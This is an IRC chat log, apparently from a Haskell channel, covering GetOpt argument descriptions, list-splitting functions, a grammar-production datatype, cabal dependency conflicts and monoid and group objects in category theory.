22:55:28 <nand`> In System.Console.GetOpt's ArgDescr a type; the constructors ReqArg and OptArg accept another string. In the examples these are set to "FILE" or "DIR". What do they affect and what options do I have for them?
22:56:23 <dmwit> They affect the help text.
22:56:42 <nand`> okay, so I just use something human understandable like "HOST:PORT"?
22:56:47 <dmwit> yes
22:57:03 <nand`> fair enough, thanks
23:02:53 <nand`> Huh; is there no splitOn :: Eq a => a -> [a] -> ([a], [a]) or maybe :: (a -> Bool) -> [a] -> ([a], [a])
23:03:16 <nand`> I can find Data.List.Split.splitOn :: Eq a => [a] -> [a] -> [[a]] but it's a bit different from what I want
23:04:56 <Saizan> partition
23:05:49 <strager> @hoogle break
23:05:49 <lambdabot> Prelude break :: (a -> Bool) -> [a] -> ([a], [a])
23:05:50 <lambdabot> Data.List break :: (a -> Bool) -> [a] -> ([a], [a])
23:05:50 <lambdabot> Data.ByteString.Char8 break :: (Char -> Bool) -> ByteString -> (ByteString, ByteString)
23:05:56 <strager> nand`: That ^?
23:07:01 <nand`> oh, “second element is the remainder of the list” <- yeah, that works
23:07:59 <strager> If you don't find something with (Eq a), try looking for a more generalized function which uses a predicate.
23:08:53 * ski smiles at `Eq a => '
23:09:13 <nand`> it's fine I'll just use (==c) instead of c as the first argument
23:09:29 <nand`> oh, nvm
23:09:31 <nand`> I see what you mean, yeah
23:09:35 <ski> .. or `(c ==)'
23:10:22 <dmwit> Yeah! For those optimized Eq instances that precompute something when handed their first argument!
23:10:43 <nand`> notably Char :P
23:12:21 <strager> Wouldn't that be pointer equality?
23:20:21 <rata_> how do I get the whole name of he functions in the heap profile?
23:30:59 <flebron> Hey. I want to specify a datatype for a context-free grammar production. I think a reasonable way is for each production to be of the form (x, […]), where x is a nonterminal, and […] is a list of things which could be either terminals, or nonterminals. What is a good datatype for this list? Either seems to fit, but its functorial semantics aren't what I want, I think.
23:32:10 <dmwit> Either seems fine. Not sure what the "functorial semantics" comment means.
23:32:16 <Ralith> wouldn't that just be (Symbol, [Symbol])?
23:32:49 <dmwit> Ralith: (NonTerminal, [Either NonTerminal Terminal]) seems more likely
23:33:01 <Ralith> oh, that would be more precise I suppose
23:33:18 <Ralith> I was envisioning data Symbol = Terminal ... | NonTerminal ...
23:33:23 <mefisto> how to handle a situation with cabal-install where some packages (in this case leksah) want a different version of mtl than other packages (in this case yesod-platform)?
23:33:33 <Ralith> but of course you wouldn't define productions with terminals
23:33:47 <dmwit> mefisto: Usually: just relax the dependencies for one of the two.
23:33:53 <flebron> dmwit, the way Either implements Functor.
23:33:58 <dmwit> mefisto: But you can have two versions installed at once if you're careful.
23:34:26 <dmwit> flebron: If you're defining a new type, I don't see why the Functor instance for one of the types you use matters.
23:34:32 <dmwit> Define your Functor instance however you like.
23:34:45 <dmwit> (subject to the functor laws, of course)
23:34:48 <flebron> Alright. Sure, I'll just not use Either's Functor.
23:34:50 <flebron> Yeah :)
23:36:02 <ski> dmwit : well, i mean that `foo (c ==) blah' often reads nicer than `foo (== c) blah', imho
23:37:13 <mefisto> dmwit: ahh cabal install yesod-platform leksah did the trick
23:37:31 <ski> flebron : you don't want to allow stuff like `E ::= N | E + N' ?
23:38:11 <dmwit> ski: (E, [N]), (E,[E,+,N]) covers that =)
23:38:13 <Ralith> ski: it presumably the right side of that would be another nonterminal.
23:38:19 <flebron> ski, why wouldn't that be allowed? (E, [Either  .. damnit
23:38:24 <Ralith> haha
23:40:56 <ski> dmwit : `E' is a nonterminal
23:41:05 <LambdaDusk> I am stuck with a design choice... My lib has 4+ ways to treat requests, and the user of the lib is to specify which of them they want to implement... each needs a different number/type of callbacks... I thought of making a type class for each but I don't know how to go on after that... what else could I do?
23:41:19 <dmwit> ski: Yes, and?
23:41:23 <ski> .. er
23:41:35 <shachaf> LambdaDusk: Don't make a type class. :-(
23:41:39 <ski> sorry, for some reason, "terminal" and "non-terminal" switched meanings in my brain
23:42:07 <ski> flebron : so, consider `E ::= N | + E E', then ?
23:42:32 <LambdaDusk> I have also thought of making a big type class with all the four methods in them, each unimplemented callback as a "Nothing"
23:42:51 <flebron> (E, [Left N]), (E, [Right +, Left E, Left E])?
23:43:35 <flebron> (Where the type of a Production is (nonterminal, [Either nonterminal terminal]))
23:43:35 <ski> flebron : ah, i see, i though the `x' in `(x,[...])' would correspond to the first token in the production body
23:43:40 <ski> (iow, ignore me :)
23:43:54 <flebron> Ah, it's OK :)
23:44:00 * ski apparently needs more tea
23:45:30 * greymalkin just realized why the chapter on monoids was not as interesting as all the hype about monads.
23:46:01 <greymalkin> ski: I think you just got your wish, with EarlGray^ coming in.
23:46:33 * ski sips a cup of EarlGray^
23:48:22 * ski finished the cup
23:48:43 <Ralith> heh
23:48:47 <flebron> So a monoid object in a monoidal category is just some object M whose morphism * : M (x) M -> M and identity t: I -> M play well with the monoidal structure of the enclosing category (the (x) and the I)?
23:50:01 <dmwit> yes
23:50:03 <ski> flebron : yes, those morphisms have to satisfy the monoid laws, expressed in a pointless way, and using the monoidal structure, instead of the usual categorical product (and terminal object)
23:50:55 <dmwit> and a group object is just a monoid object for which all endomorphisms are automorphisms ;-)
23:50:56 <ski> so, this way you can talk about a monoid/group not only in `Set', but also in `Man',&c.
23:51:54 <ski> dmwit : no
23:52:22 <dmwit> oh, crap, is group object an actual term?
23:53:09 <dmwit> Wikipedia's definition of group object seems to coincide with mine...
23:53:20 <ski> e.g. in the monoidal category `Set', consider the group on the set `{False,True}' with the group operation being exclusive disjunction, and identity element is `False'
23:54:20 <ski> dmwit : i don't see where
23:54:48 <dmwit> That's not a group object in Set.
23:55:01 <ski> (the point being that this set has endomorphisms which aren't automorphisms -- the morphisms are taken in `Set', of course, not in `GroupOver Set')
23:55:19 <dmwit> ...um
23:55:44 <ski>   m : 2 * 2 >---> 2
23:55:50 <ski>   e :   1   >---> 2
23:55:54 <ski>   i :   2   >---> 2
23:56:06 <ski>   m (False,False) = False
23:56:13 <ski>   m (False,True ) = True
23:56:19 <ski>   m (True ,False) = True
23:56:25 <ski>   m (True ,True ) = False
23:56:33 <ski>   e () = False
23:56:37 <ski>   i False = True
23:56:40 <ski>   i True = False
23:56:45 <catery> lets go back to talking about rts in haskell
23:56:53 <Ralith> let's not
23:57:11 <dmwit> aaa, now I understand where my confusion arose.
23:57:17 <ski> ok ?
23:57:38 <catery> ralith you hate rts games?
23:57:58 <Ralith> no, I just think you would be better served by going out and trying it.
23:58:07 <dmwit> I should say instead: if we think of a monoid (in Set) as a (one-object) category, then it's a group exactly when all the morphisms are automorphisms.
23:58:25 <flebron> ski, when you say "instead of the usual categorical product and terminal object", you mean that there's a standard notion of monoidal category where the product is the categorical product, and the identity is the terminal object?
23:58:53 <flebron> (and I suppose there would also exist one with coproducts and initial objects)
23:58:56 <dmwit> I keep thinking a monoid object is somehow the one object in the category associated with that monoid, but that's just a confused idea to have.
23:59:17 <qtplatypus> Learning by doing is a very strong idea.  catery try even if you fail you will have learned something.
23:59:54 <ski> flebron : yes, and yes
23:59:59 <catery> I demand to be spoon fed
